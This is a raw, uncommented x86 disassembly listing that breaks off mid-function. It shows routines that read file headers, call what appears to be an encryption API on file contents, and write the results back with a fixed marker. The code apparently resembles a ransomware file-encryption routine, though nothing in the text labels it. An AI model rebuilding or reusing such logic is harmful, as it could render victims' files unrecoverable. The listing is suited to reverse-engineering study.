  4036dd:	2b c7                	sub    %edi,%eax
  4036df:	d1 f8                	sar    $1,%eax
  4036e1:	8d 74 00 fe          	lea    -0x2(%eax,%eax,1),%esi
  4036e5:	8d 46 1c             	lea    0x1c(%esi),%eax
  4036e8:	8b c8                	mov    %eax,%ecx
  4036ea:	83 e1 0f             	and    $0xf,%ecx
  4036ed:	89 44 24 18          	mov    %eax,0x18(%esp)
  4036f1:	74 0d                	je     0x403700
  4036f3:	ba 10 00 00 00       	mov    $0x10,%edx
  4036f8:	2b d1                	sub    %ecx,%edx
  4036fa:	03 c2                	add    %edx,%eax
  4036fc:	89 44 24 18          	mov    %eax,0x18(%esp)
  403700:	85 c0                	test   %eax,%eax
  403702:	0f 84 c2 03 00 00    	je     0x403aca
  403708:	50                   	push   %eax
  403709:	6a 00                	push   $0x0
  40370b:	ff 15 90 80 40 00    	call   *0x408090
  403711:	50                   	push   %eax
  403712:	ff 15 84 80 40 00    	call   *0x408084
  403718:	85 c0                	test   %eax,%eax
  40371a:	89 44 24 24          	mov    %eax,0x24(%esp)
  40371e:	0f 84 a6 03 00 00    	je     0x403aca
  403724:	33 c9                	xor    %ecx,%ecx
  403726:	89 08                	mov    %ecx,(%eax)
  403728:	89 48 04             	mov    %ecx,0x4(%eax)
  40372b:	89 48 08             	mov    %ecx,0x8(%eax)
  40372e:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  403732:	89 48 0c             	mov    %ecx,0xc(%eax)
  403735:	8b 54 24 34          	mov    0x34(%esp),%edx
  403739:	56                   	push   %esi
  40373a:	89 50 10             	mov    %edx,0x10(%eax)
  40373d:	89 70 14             	mov    %esi,0x14(%eax)
  403740:	83 c0 18             	add    $0x18,%eax
  403743:	57                   	push   %edi
  403744:	50                   	push   %eax
  403745:	e8 f6 d9 ff ff       	call   0x401140
  40374a:	8b 7c 24 30          	mov    0x30(%esp),%edi
  40374e:	83 c4 0c             	add    $0xc,%esp
  403751:	8d 56 18             	lea    0x18(%esi),%edx
  403754:	8b c7                	mov    %edi,%eax
  403756:	e8 95 09 00 00       	call   0x4040f0
  40375b:	89 44 3e 18          	mov    %eax,0x18(%esi,%edi,1)
  40375f:	8b 44 24 18          	mov    0x18(%esp),%eax
  403763:	8b 54 24 14          	mov    0x14(%esp),%edx
  403767:	8b cf                	mov    %edi,%ecx
  403769:	e8 c2 f3 ff ff       	call   0x402b30
  40376e:	85 c0                	test   %eax,%eax
  403770:	0f 84 40 03 00 00    	je     0x403ab6
  403776:	8b 44 24 14          	mov    0x14(%esp),%eax
  40377a:	50                   	push   %eax
  40377b:	ff 15 24 80 40 00    	call   *0x408024
  403781:	6a 02                	push   $0x2
  403783:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  403787:	51                   	push   %ecx
  403788:	33 c0                	xor    %eax,%eax
  40378a:	50                   	push   %eax
  40378b:	50                   	push   %eax
  40378c:	55                   	push   %ebp
  40378d:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  403794:	00 
  403795:	ff 15 a8 80 40 00    	call   *0x4080a8
  40379b:	85 c0                	test   %eax,%eax
  40379d:	0f 84 13 03 00 00    	je     0x403ab6
  4037a3:	8b 35 f8 80 40 00    	mov    0x4080f8,%esi
  4037a9:	6a 00                	push   $0x0
  4037ab:	8d 54 24 14          	lea    0x14(%esp),%edx
  4037af:	52                   	push   %edx
  4037b0:	6a 08                	push   $0x8
  4037b2:	8d 44 24 34          	lea    0x34(%esp),%eax
  4037b6:	50                   	push   %eax
  4037b7:	55                   	push   %ebp
  4037b8:	ff d6                	call   *%esi
  4037ba:	85 c0                	test   %eax,%eax
  4037bc:	0f 84 f4 02 00 00    	je     0x403ab6
  4037c2:	83 7c 24 10 08       	cmpl   $0x8,0x10(%esp)
  4037c7:	0f 82 e9 02 00 00    	jb     0x403ab6
  4037cd:	8b 54 24 18          	mov    0x18(%esp),%edx
  4037d1:	6a 00                	push   $0x0
  4037d3:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4037d7:	51                   	push   %ecx
  4037d8:	52                   	push   %edx
  4037d9:	57                   	push   %edi
  4037da:	55                   	push   %ebp
  4037db:	ff d6                	call   *%esi
  4037dd:	85 c0                	test   %eax,%eax
  4037df:	0f 84 d1 02 00 00    	je     0x403ab6
  4037e5:	8b 44 24 10          	mov    0x10(%esp),%eax
  4037e9:	3b 44 24 18          	cmp    0x18(%esp),%eax
  4037ed:	0f 82 c3 02 00 00    	jb     0x403ab6
  4037f3:	6a 00                	push   $0x0
  4037f5:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4037f9:	51                   	push   %ecx
  4037fa:	6a 04                	push   $0x4
  4037fc:	8d 54 24 24          	lea    0x24(%esp),%edx
  403800:	52                   	push   %edx
  403801:	55                   	push   %ebp
  403802:	ff d6                	call   *%esi
  403804:	85 c0                	test   %eax,%eax
  403806:	0f 84 aa 02 00 00    	je     0x403ab6
  40380c:	83 7c 24 10 04       	cmpl   $0x4,0x10(%esp)
  403811:	0f 82 9f 02 00 00    	jb     0x403ab6
  403817:	8b 7c 24 20          	mov    0x20(%esp),%edi
  40381b:	6a 00                	push   $0x0
  40381d:	8d 44 24 14          	lea    0x14(%esp),%eax
  403821:	50                   	push   %eax
  403822:	6a 10                	push   $0x10
  403824:	57                   	push   %edi
  403825:	55                   	push   %ebp
  403826:	ff d6                	call   *%esi
  403828:	85 c0                	test   %eax,%eax
  40382a:	0f 84 86 02 00 00    	je     0x403ab6
  403830:	83 7c 24 10 10       	cmpl   $0x10,0x10(%esp)
  403835:	0f 82 7b 02 00 00    	jb     0x403ab6
  40383b:	80 7c 24 0e 01       	cmpb   $0x1,0xe(%esp)
  403840:	75 07                	jne    0x403849
  403842:	8b 0b                	mov    (%ebx),%ecx
  403844:	8b 41 24             	mov    0x24(%ecx),%eax
  403847:	eb 05                	jmp    0x40384e
  403849:	8b 13                	mov    (%ebx),%edx
  40384b:	8b 42 2c             	mov    0x2c(%edx),%eax
  40384e:	6a 00                	push   $0x0
  403850:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  403854:	51                   	push   %ecx
  403855:	68 80 00 00 00       	push   $0x80
  40385a:	50                   	push   %eax
  40385b:	55                   	push   %ebp
  40385c:	ff d6                	call   *%esi
  40385e:	85 c0                	test   %eax,%eax
  403860:	0f 84 50 02 00 00    	je     0x403ab6
  403866:	81 7c 24 10 80 00 00 	cmpl   $0x80,0x10(%esp)
  40386d:	00 
  40386e:	0f 82 42 02 00 00    	jb     0x403ab6
  403874:	6a 00                	push   $0x0
  403876:	8d 54 24 14          	lea    0x14(%esp),%edx
  40387a:	52                   	push   %edx
  40387b:	6a 04                	push   $0x4
  40387d:	68 20 90 41 00       	push   $0x419020
  403882:	55                   	push   %ebp
  403883:	ff d6                	call   *%esi
  403885:	85 c0                	test   %eax,%eax
  403887:	0f 84 29 02 00 00    	je     0x403ab6
  40388d:	83 7c 24 10 04       	cmpl   $0x4,0x10(%esp)
  403892:	0f 82 1e 02 00 00    	jb     0x403ab6
  403898:	6a 00                	push   $0x0
  40389a:	8d 44 24 14          	lea    0x14(%esp),%eax
  40389e:	50                   	push   %eax
  40389f:	6a 04                	push   $0x4
  4038a1:	68 14 90 41 00       	push   $0x419014
  4038a6:	55                   	push   %ebp
  4038a7:	ff d6                	call   *%esi
  4038a9:	85 c0                	test   %eax,%eax
  4038ab:	0f 84 05 02 00 00    	je     0x403ab6
  4038b1:	83 7c 24 10 04       	cmpl   $0x4,0x10(%esp)
  4038b6:	0f 82 fa 01 00 00    	jb     0x403ab6
  4038bc:	80 7c 24 0e 01       	cmpb   $0x1,0xe(%esp)
  4038c1:	75 07                	jne    0x4038ca
  4038c3:	8b 0b                	mov    (%ebx),%ecx
  4038c5:	8b 41 20             	mov    0x20(%ecx),%eax
  4038c8:	eb 05                	jmp    0x4038cf
  4038ca:	8b 13                	mov    (%ebx),%edx
  4038cc:	8b 42 28             	mov    0x28(%edx),%eax
  4038cf:	57                   	push   %edi
  4038d0:	50                   	push   %eax
  4038d1:	8d 7c 24 1c          	lea    0x1c(%esp),%edi
  4038d5:	e8 e6 f1 ff ff       	call   0x402ac0
  4038da:	84 c0                	test   %al,%al
  4038dc:	0f 84 d4 01 00 00    	je     0x403ab6
  4038e2:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4038e6:	3b 44 24 34          	cmp    0x34(%esp),%eax
  4038ea:	0f 8f 79 01 00 00    	jg     0x403a69
  4038f0:	7c 0e                	jl     0x403900
  4038f2:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  4038f6:	3b 4c 24 30          	cmp    0x30(%esp),%ecx
  4038fa:	0f 83 69 01 00 00    	jae    0x403a69
  403900:	8b 54 24 28          	mov    0x28(%esp),%edx
  403904:	6a 00                	push   $0x0
  403906:	6a 00                	push   $0x0
  403908:	50                   	push   %eax
  403909:	52                   	push   %edx
  40390a:	55                   	push   %ebp
  40390b:	ff 15 a8 80 40 00    	call   *0x4080a8
  403911:	85 c0                	test   %eax,%eax
  403913:	0f 84 9d 01 00 00    	je     0x403ab6
  403919:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  40391d:	8b 44 24 34          	mov    0x34(%esp),%eax
  403921:	8b 7b 10             	mov    0x10(%ebx),%edi
  403924:	33 f6                	xor    %esi,%esi
  403926:	2b 4c 24 28          	sub    0x28(%esp),%ecx
  40392a:	1b 44 24 2c          	sbb    0x2c(%esp),%eax
  40392e:	33 d2                	xor    %edx,%edx
  403930:	3b c2                	cmp    %edx,%eax
  403932:	7f 0c                	jg     0x403940
  403934:	7c 04                	jl     0x40393a
  403936:	3b cf                	cmp    %edi,%ecx
  403938:	73 06                	jae    0x403940
  40393a:	89 44 24 44          	mov    %eax,0x44(%esp)
  40393e:	eb 06                	jmp    0x403946
  403940:	8b cf                	mov    %edi,%ecx
  403942:	89 54 24 44          	mov    %edx,0x44(%esp)
  403946:	6a 00                	push   $0x0
  403948:	8d 44 24 20          	lea    0x20(%esp),%eax
  40394c:	50                   	push   %eax
  40394d:	51                   	push   %ecx
  40394e:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  403951:	51                   	push   %ecx
  403952:	55                   	push   %ebp
  403953:	ff 15 70 80 40 00    	call   *0x408070
  403959:	85 c0                	test   %eax,%eax
  40395b:	0f 84 55 01 00 00    	je     0x403ab6
  403961:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403965:	85 c0                	test   %eax,%eax
  403967:	0f 84 f6 00 00 00    	je     0x403a63
  40396d:	3b 43 10             	cmp    0x10(%ebx),%eax
  403970:	73 23                	jae    0x403995
  403972:	8b c8                	mov    %eax,%ecx
  403974:	83 e1 0f             	and    $0xf,%ecx
  403977:	74 1c                	je     0x403995
  403979:	8b 53 0c             	mov    0xc(%ebx),%edx
  40397c:	be 10 00 00 00       	mov    $0x10,%esi
  403981:	2b f1                	sub    %ecx,%esi
  403983:	56                   	push   %esi
  403984:	03 d0                	add    %eax,%edx
  403986:	6a 00                	push   $0x0
  403988:	52                   	push   %edx
  403989:	e8 72 d7 ff ff       	call   0x401100
  40398e:	8b 44 24 28          	mov    0x28(%esp),%eax
  403992:	83 c4 0c             	add    $0xc,%esp
  403995:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  403998:	8b 54 24 14          	mov    0x14(%esp),%edx
  40399c:	03 c6                	add    %esi,%eax
  40399e:	e8 8d f1 ff ff       	call   0x402b30
  4039a3:	85 c0                	test   %eax,%eax
  4039a5:	0f 84 0b 01 00 00    	je     0x403ab6
  4039ab:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4039af:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  4039b3:	6a 00                	push   $0x0
  4039b5:	6a 00                	push   $0x0
  4039b7:	50                   	push   %eax
  4039b8:	51                   	push   %ecx
  4039b9:	55                   	push   %ebp
  4039ba:	ff 15 a8 80 40 00    	call   *0x4080a8
  4039c0:	85 c0                	test   %eax,%eax
  4039c2:	0f 84 ee 00 00 00    	je     0x403ab6
  4039c8:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4039cc:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  4039cf:	6a 00                	push   $0x0
  4039d1:	8d 54 24 14          	lea    0x14(%esp),%edx
  4039d5:	52                   	push   %edx
  4039d6:	03 c6                	add    %esi,%eax
  4039d8:	50                   	push   %eax
  4039d9:	51                   	push   %ecx
  4039da:	55                   	push   %ebp
  4039db:	ff 15 f8 80 40 00    	call   *0x4080f8
  4039e1:	85 c0                	test   %eax,%eax
  4039e3:	0f 84 cd 00 00 00    	je     0x403ab6
  4039e9:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4039ed:	8d 14 30             	lea    (%eax,%esi,1),%edx
  4039f0:	39 54 24 10          	cmp    %edx,0x10(%esp)
  4039f4:	0f 82 bc 00 00 00    	jb     0x403ab6
  4039fa:	01 44 24 28          	add    %eax,0x28(%esp)
  4039fe:	83 54 24 2c 00       	adcl   $0x0,0x2c(%esp)
  403a03:	3b 43 10             	cmp    0x10(%ebx),%eax
  403a06:	72 5b                	jb     0x403a63
  403a08:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  403a0c:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  403a10:	6a 00                	push   $0x0
  403a12:	6a 00                	push   $0x0
  403a14:	50                   	push   %eax
  403a15:	51                   	push   %ecx
  403a16:	55                   	push   %ebp
  403a17:	ff 15 a8 80 40 00    	call   *0x4080a8
  403a1d:	85 c0                	test   %eax,%eax
  403a1f:	0f 84 91 00 00 00    	je     0x403ab6
  403a25:	6a 00                	push   $0x0
  403a27:	8d 54 24 14          	lea    0x14(%esp),%edx
  403a2b:	52                   	push   %edx
  403a2c:	6a 08                	push   $0x8
  403a2e:	8d 44 24 34          	lea    0x34(%esp),%eax
  403a32:	50                   	push   %eax
  403a33:	55                   	push   %ebp
  403a34:	ff 15 f8 80 40 00    	call   *0x4080f8
  403a3a:	85 c0                	test   %eax,%eax
  403a3c:	74 78                	je     0x403ab6
  403a3e:	83 7c 24 10 08       	cmpl   $0x8,0x10(%esp)
  403a43:	72 71                	jb     0x403ab6
  403a45:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403a49:	3b 44 24 34          	cmp    0x34(%esp),%eax
  403a4d:	0f 8c ad fe ff ff    	jl     0x403900
  403a53:	7f 0e                	jg     0x403a63
  403a55:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  403a59:	3b 4c 24 30          	cmp    0x30(%esp),%ecx
  403a5d:	0f 82 9d fe ff ff    	jb     0x403900
  403a63:	8b 35 f8 80 40 00    	mov    0x4080f8,%esi
  403a69:	8b 54 24 14          	mov    0x14(%esp),%edx
  403a6d:	52                   	push   %edx
  403a6e:	ff 15 24 80 40 00    	call   *0x408024
  403a74:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  403a78:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  403a7c:	6a 00                	push   $0x0
  403a7e:	6a 00                	push   $0x0
  403a80:	50                   	push   %eax
  403a81:	51                   	push   %ecx
  403a82:	55                   	push   %ebp
  403a83:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  403a8a:	00 
  403a8b:	ff 15 a8 80 40 00    	call   *0x4080a8
  403a91:	85 c0                	test   %eax,%eax
  403a93:	74 21                	je     0x403ab6
  403a95:	6a 00                	push   $0x0
  403a97:	8d 54 24 14          	lea    0x14(%esp),%edx
  403a9b:	52                   	push   %edx
  403a9c:	6a 08                	push   $0x8
  403a9e:	68 00 90 40 00       	push   $0x409000
  403aa3:	55                   	push   %ebp
  403aa4:	ff d6                	call   *%esi
  403aa6:	85 c0                	test   %eax,%eax
  403aa8:	74 0c                	je     0x403ab6
  403aaa:	83 7c 24 10 08       	cmpl   $0x8,0x10(%esp)
  403aaf:	72 05                	jb     0x403ab6
  403ab1:	c6 44 24 0f 01       	movb   $0x1,0xf(%esp)
  403ab6:	8b 44 24 24          	mov    0x24(%esp),%eax
  403aba:	50                   	push   %eax
  403abb:	6a 00                	push   $0x0
  403abd:	ff 15 90 80 40 00    	call   *0x408090
  403ac3:	50                   	push   %eax
  403ac4:	ff 15 8c 80 40 00    	call   *0x40808c
  403aca:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403ace:	51                   	push   %ecx
  403acf:	6a 00                	push   $0x0
  403ad1:	ff 15 90 80 40 00    	call   *0x408090
  403ad7:	50                   	push   %eax
  403ad8:	ff 15 8c 80 40 00    	call   *0x40808c
  403ade:	8b 44 24 14          	mov    0x14(%esp),%eax
  403ae2:	85 c0                	test   %eax,%eax
  403ae4:	74 07                	je     0x403aed
  403ae6:	50                   	push   %eax
  403ae7:	ff 15 24 80 40 00    	call   *0x408024
  403aed:	8a 44 24 0f          	mov    0xf(%esp),%al
  403af1:	5f                   	pop    %edi
  403af2:	5e                   	pop    %esi
  403af3:	5d                   	pop    %ebp
  403af4:	83 c4 48             	add    $0x48,%esp
  403af7:	c3                   	ret
  403af8:	cc                   	int3
  403af9:	cc                   	int3
  403afa:	cc                   	int3
  403afb:	cc                   	int3
  403afc:	cc                   	int3
  403afd:	cc                   	int3
  403afe:	cc                   	int3
  403aff:	cc                   	int3
  403b00:	8b 4f 14             	mov    0x14(%edi),%ecx
  403b03:	8b 57 0c             	mov    0xc(%edi),%edx
  403b06:	83 ec 0c             	sub    $0xc,%esp
  403b09:	55                   	push   %ebp
  403b0a:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  403b0e:	56                   	push   %esi
  403b0f:	33 f6                	xor    %esi,%esi
  403b11:	56                   	push   %esi
  403b12:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403b16:	50                   	push   %eax
  403b17:	51                   	push   %ecx
  403b18:	52                   	push   %edx
  403b19:	53                   	push   %ebx
  403b1a:	ff 15 70 80 40 00    	call   *0x408070
  403b20:	85 c0                	test   %eax,%eax
  403b22:	0f 84 a1 00 00 00    	je     0x403bc9
  403b28:	8b 44 24 08          	mov    0x8(%esp),%eax
  403b2c:	85 c0                	test   %eax,%eax
  403b2e:	75 08                	jne    0x403b38
  403b30:	b0 01                	mov    $0x1,%al
  403b32:	5e                   	pop    %esi
  403b33:	5d                   	pop    %ebp
  403b34:	83 c4 0c             	add    $0xc,%esp
  403b37:	c3                   	ret
  403b38:	3b 47 14             	cmp    0x14(%edi),%eax
  403b3b:	73 23                	jae    0x403b60
  403b3d:	8b c8                	mov    %eax,%ecx
  403b3f:	83 e1 0f             	and    $0xf,%ecx
  403b42:	74 1c                	je     0x403b60
  403b44:	be 10 00 00 00       	mov    $0x10,%esi
  403b49:	2b f1                	sub    %ecx,%esi
  403b4b:	8b 4f 0c             	mov    0xc(%edi),%ecx
  403b4e:	56                   	push   %esi
  403b4f:	03 c8                	add    %eax,%ecx
  403b51:	6a 00                	push   $0x0
  403b53:	51                   	push   %ecx
  403b54:	e8 a7 d5 ff ff       	call   0x401100
  403b59:	8b 44 24 14          	mov    0x14(%esp),%eax
  403b5d:	83 c4 0c             	add    $0xc,%esp
  403b60:	8b 4f 0c             	mov    0xc(%edi),%ecx
  403b63:	03 c6                	add    %esi,%eax
  403b65:	50                   	push   %eax
  403b66:	8d 54 24 10          	lea    0x10(%esp),%edx
  403b6a:	52                   	push   %edx
  403b6b:	51                   	push   %ecx
  403b6c:	6a 00                	push   $0x0
  403b6e:	6a 00                	push   $0x0
  403b70:	89 44 24 20          	mov    %eax,0x20(%esp)
  403b74:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403b78:	6a 00                	push   $0x0
  403b7a:	50                   	push   %eax
  403b7b:	ff 15 38 80 40 00    	call   *0x408038
  403b81:	85 c0                	test   %eax,%eax
  403b83:	74 44                	je     0x403bc9
  403b85:	8b 4d 04             	mov    0x4(%ebp),%ecx
  403b88:	8b 55 00             	mov    0x0(%ebp),%edx
  403b8b:	6a 00                	push   $0x0
  403b8d:	6a 00                	push   $0x0
  403b8f:	51                   	push   %ecx
  403b90:	52                   	push   %edx
  403b91:	53                   	push   %ebx
  403b92:	ff 15 a8 80 40 00    	call   *0x4080a8
  403b98:	85 c0                	test   %eax,%eax
  403b9a:	74 2d                	je     0x403bc9
  403b9c:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403ba0:	8b 57 0c             	mov    0xc(%edi),%edx
  403ba3:	6a 00                	push   $0x0
  403ba5:	8d 44 24 14          	lea    0x14(%esp),%eax
  403ba9:	50                   	push   %eax
  403baa:	03 ce                	add    %esi,%ecx
  403bac:	51                   	push   %ecx
  403bad:	52                   	push   %edx
  403bae:	53                   	push   %ebx
  403baf:	ff 15 f8 80 40 00    	call   *0x4080f8
  403bb5:	85 c0                	test   %eax,%eax
  403bb7:	74 10                	je     0x403bc9
  403bb9:	8b 44 24 08          	mov    0x8(%esp),%eax
  403bbd:	03 c6                	add    %esi,%eax
  403bbf:	39 44 24 10          	cmp    %eax,0x10(%esp)
  403bc3:	0f 83 67 ff ff ff    	jae    0x403b30
  403bc9:	5e                   	pop    %esi
  403bca:	32 c0                	xor    %al,%al
  403bcc:	5d                   	pop    %ebp
  403bcd:	83 c4 0c             	add    $0xc,%esp
  403bd0:	c3                   	ret
  403bd1:	cc                   	int3
  403bd2:	cc                   	int3
  403bd3:	cc                   	int3
  403bd4:	cc                   	int3
  403bd5:	cc                   	int3
  403bd6:	cc                   	int3
  403bd7:	cc                   	int3
  403bd8:	cc                   	int3
  403bd9:	cc                   	int3
  403bda:	cc                   	int3
  403bdb:	cc                   	int3
  403bdc:	cc                   	int3
  403bdd:	cc                   	int3
  403bde:	cc                   	int3
  403bdf:	cc                   	int3
  403be0:	83 ec 2c             	sub    $0x2c,%esp
  403be3:	53                   	push   %ebx
  403be4:	55                   	push   %ebp
  403be5:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  403be9:	56                   	push   %esi
  403bea:	57                   	push   %edi
  403beb:	8b f0                	mov    %eax,%esi
  403bed:	8d 44 24 30          	lea    0x30(%esp),%eax
  403bf1:	50                   	push   %eax
  403bf2:	55                   	push   %ebp
  403bf3:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  403bfa:	00 
  403bfb:	c6 44 24 1e 00       	movb   $0x0,0x1e(%esp)
  403c00:	ff 15 78 80 40 00    	call   *0x408078
  403c06:	85 c0                	test   %eax,%eax
  403c08:	0f 84 f9 02 00 00    	je     0x403f07
  403c0e:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  403c12:	8b 54 24 30          	mov    0x30(%esp),%edx
  403c16:	6a 00                	push   $0x0
  403c18:	6a 03                	push   $0x3
  403c1a:	51                   	push   %ecx
  403c1b:	52                   	push   %edx
  403c1c:	e8 8f 3c 00 00       	call   0x4078b0
  403c21:	89 44 24 28          	mov    %eax,0x28(%esp)
  403c25:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  403c29:	e8 b2 ea ff ff       	call   0x4026e0
  403c2e:	8b d8                	mov    %eax,%ebx
  403c30:	85 db                	test   %ebx,%ebx
  403c32:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  403c36:	0f 84 cb 02 00 00    	je     0x403f07
  403c3c:	8b 7c 24 40          	mov    0x40(%esp),%edi
  403c40:	8b 07                	mov    (%edi),%eax
  403c42:	8a 48 30             	mov    0x30(%eax),%cl
  403c45:	80 f9 01             	cmp    $0x1,%cl
  403c48:	0f 94 c2             	sete   %dl
  403c4b:	80 c2 01             	add    $0x1,%dl
  403c4e:	80 f9 01             	cmp    $0x1,%cl
  403c51:	88 4c 24 17          	mov    %cl,0x17(%esp)
  403c55:	88 50 30             	mov    %dl,0x30(%eax)
  403c58:	75 07                	jne    0x403c61
  403c5a:	8b 07                	mov    (%edi),%eax
  403c5c:	8b 40 20             	mov    0x20(%eax),%eax
  403c5f:	eb 05                	jmp    0x403c66
  403c61:	8b 0f                	mov    (%edi),%ecx
  403c63:	8b 41 28             	mov    0x28(%ecx),%eax
  403c66:	53                   	push   %ebx
  403c67:	50                   	push   %eax
  403c68:	8d 7c 24 24          	lea    0x24(%esp),%edi
  403c6c:	e8 4f ee ff ff       	call   0x402ac0
  403c71:	84 c0                	test   %al,%al
  403c73:	0f 84 7e 02 00 00    	je     0x403ef7
  403c79:	8b c6                	mov    %esi,%eax
  403c7b:	eb 03                	jmp    0x403c80
  403c7d:	8d 49 00             	lea    0x0(%ecx),%ecx
  403c80:	66 8b 10             	mov    (%eax),%dx
  403c83:	83 c0 02             	add    $0x2,%eax
  403c86:	66 85 d2             	test   %dx,%dx
  403c89:	75 f5                	jne    0x403c80
  403c8b:	eb 03                	jmp    0x403c90
  403c8d:	8d 49 00             	lea    0x0(%ecx),%ecx
  403c90:	83 e8 02             	sub    $0x2,%eax
  403c93:	3b c6                	cmp    %esi,%eax
  403c95:	74 0b                	je     0x403ca2
  403c97:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  403c9b:	75 f3                	jne    0x403c90
  403c9d:	8d 58 02             	lea    0x2(%eax),%ebx
  403ca0:	eb 0d                	jmp    0x403caf
  403ca2:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  403ca6:	75 05                	jne    0x403cad
  403ca8:	8d 58 02             	lea    0x2(%eax),%ebx
  403cab:	eb 02                	jmp    0x403caf
  403cad:	8b de                	mov    %esi,%ebx
  403caf:	8b c3                	mov    %ebx,%eax
  403cb1:	66 8b 08             	mov    (%eax),%cx
  403cb4:	83 c0 02             	add    $0x2,%eax
  403cb7:	66 85 c9             	test   %cx,%cx
  403cba:	75 f5                	jne    0x403cb1
  403cbc:	2b c3                	sub    %ebx,%eax
  403cbe:	d1 f8                	sar    $1,%eax
  403cc0:	8d 7c 00 fe          	lea    -0x2(%eax,%eax,1),%edi
  403cc4:	8d 47 1c             	lea    0x1c(%edi),%eax
  403cc7:	8b c8                	mov    %eax,%ecx
  403cc9:	83 e1 0f             	and    $0xf,%ecx
  403ccc:	89 44 24 20          	mov    %eax,0x20(%esp)
  403cd0:	74 0d                	je     0x403cdf
  403cd2:	ba 10 00 00 00       	mov    $0x10,%edx
  403cd7:	2b d1                	sub    %ecx,%edx
  403cd9:	03 c2                	add    %edx,%eax
  403cdb:	89 44 24 20          	mov    %eax,0x20(%esp)
  403cdf:	85 c0                	test   %eax,%eax
  403ce1:	0f 84 0c 02 00 00    	je     0x403ef3
  403ce7:	50                   	push   %eax
  403ce8:	6a 00                	push   $0x0
  403cea:	ff 15 90 80 40 00    	call   *0x408090
  403cf0:	50                   	push   %eax
  403cf1:	ff 15 84 80 40 00    	call   *0x408084
  403cf7:	8b f0                	mov    %eax,%esi
  403cf9:	85 f6                	test   %esi,%esi
  403cfb:	0f 84 f2 01 00 00    	je     0x403ef3
  403d01:	8b 44 24 40          	mov    0x40(%esp),%eax
  403d05:	8b 48 14             	mov    0x14(%eax),%ecx
  403d08:	8b 54 24 28          	mov    0x28(%esp),%edx
  403d0c:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403d10:	89 46 08             	mov    %eax,0x8(%esi)
  403d13:	89 0e                	mov    %ecx,(%esi)
  403d15:	89 56 04             	mov    %edx,0x4(%esi)
  403d18:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  403d1c:	57                   	push   %edi
  403d1d:	89 4e 0c             	mov    %ecx,0xc(%esi)
  403d20:	8b 54 24 38          	mov    0x38(%esp),%edx
  403d24:	8d 46 18             	lea    0x18(%esi),%eax
  403d27:	53                   	push   %ebx
  403d28:	50                   	push   %eax
  403d29:	89 56 10             	mov    %edx,0x10(%esi)
  403d2c:	89 7e 14             	mov    %edi,0x14(%esi)
  403d2f:	e8 0c d4 ff ff       	call   0x401140
  403d34:	83 c4 0c             	add    $0xc,%esp
  403d37:	8d 57 18             	lea    0x18(%edi),%edx
  403d3a:	8b c6                	mov    %esi,%eax
  403d3c:	e8 af 03 00 00       	call   0x4040f0
  403d41:	89 44 37 18          	mov    %eax,0x18(%edi,%esi,1)
  403d45:	8b 44 24 20          	mov    0x20(%esp),%eax
  403d49:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  403d4d:	50                   	push   %eax
  403d4e:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  403d52:	51                   	push   %ecx
  403d53:	56                   	push   %esi
  403d54:	6a 00                	push   $0x0
  403d56:	6a 00                	push   $0x0
  403d58:	6a 00                	push   $0x0
  403d5a:	52                   	push   %edx
  403d5b:	89 44 24 44          	mov    %eax,0x44(%esp)
  403d5f:	ff 15 38 80 40 00    	call   *0x408038
  403d65:	85 c0                	test   %eax,%eax
  403d67:	0f 84 76 01 00 00    	je     0x403ee3
  403d6d:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403d71:	50                   	push   %eax
  403d72:	ff 15 24 80 40 00    	call   *0x408024
  403d78:	8b 54 24 20          	mov    0x20(%esp),%edx
  403d7c:	8b 3d f8 80 40 00    	mov    0x4080f8,%edi
  403d82:	6a 00                	push   $0x0
  403d84:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  403d88:	51                   	push   %ecx
  403d89:	52                   	push   %edx
  403d8a:	56                   	push   %esi
  403d8b:	55                   	push   %ebp
  403d8c:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  403d93:	00 
  403d94:	ff d7                	call   *%edi
  403d96:	85 c0                	test   %eax,%eax
  403d98:	0f 84 45 01 00 00    	je     0x403ee3
  403d9e:	8b 44 24 18          	mov    0x18(%esp),%eax
  403da2:	3b 44 24 20          	cmp    0x20(%esp),%eax
  403da6:	0f 82 37 01 00 00    	jb     0x403ee3
  403dac:	6a 00                	push   $0x0
  403dae:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  403db2:	51                   	push   %ecx
  403db3:	6a 04                	push   $0x4
